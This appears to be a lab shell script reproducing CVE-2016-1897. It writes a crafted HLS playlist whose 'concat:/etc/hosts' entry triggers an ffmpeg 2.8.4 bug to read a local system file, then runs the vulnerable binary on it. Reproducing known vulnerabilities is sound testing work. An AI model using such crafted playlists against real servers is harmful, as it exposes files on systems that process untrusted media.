#!/bin/sh
# Demonstrate CVE-2016-1897 using the vulnerable ffmpeg 2.8.4 binary

# Create a malicious HLS playlist that triggers the concat protocol bug.
cat > /tmp/malicious.m3u8 <<'EOF'
#EXTM3U
#EXTINF:10,
http://example.com/doesnotexist
#EXT-X-DISCONTINUITY
#EXTINF:0,
concat:/etc/hosts?0
EOF

echo "Running vulnerable ffmpeg on crafted playlist..."
# Allow the concat, file and http protocols explicitly (required by newer ffmpeg builds)
ffmpeg -protocol_whitelist "file,http,concat,https" -i /tmp/malicious.m3u8 -f null - 2>&1 | grep "request"

# Keep container alive so the exposed port stays reachable
while true; do
  sleep 3600
done